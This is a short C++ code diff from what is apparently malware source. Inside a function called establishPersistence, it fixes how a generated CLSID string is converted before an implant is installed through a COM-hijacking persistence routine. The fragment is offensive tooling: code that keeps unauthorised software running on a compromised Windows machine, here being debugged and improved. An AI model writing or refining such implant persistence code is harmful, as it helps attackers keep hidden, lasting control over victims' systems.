@@ -84,7 +84,10 @@ void establishPersistence() {
         wchar_t guid_w[40];
         StringFromGUID2(guid, guid_w, 40);
         std::wstring clsid_w(guid_w);
-        std::string clsid(clsid_w.begin(), clsid_w.end());
+
+        int clsid_size_needed = WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), NULL, 0, NULL, NULL);
+        std::string clsid(clsid_size_needed, 0);
+        WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), &clsid[0], clsid_size_needed, NULL, NULL);
 
         persistence::ComHijacker::Install(implantPath, clsid);
     }
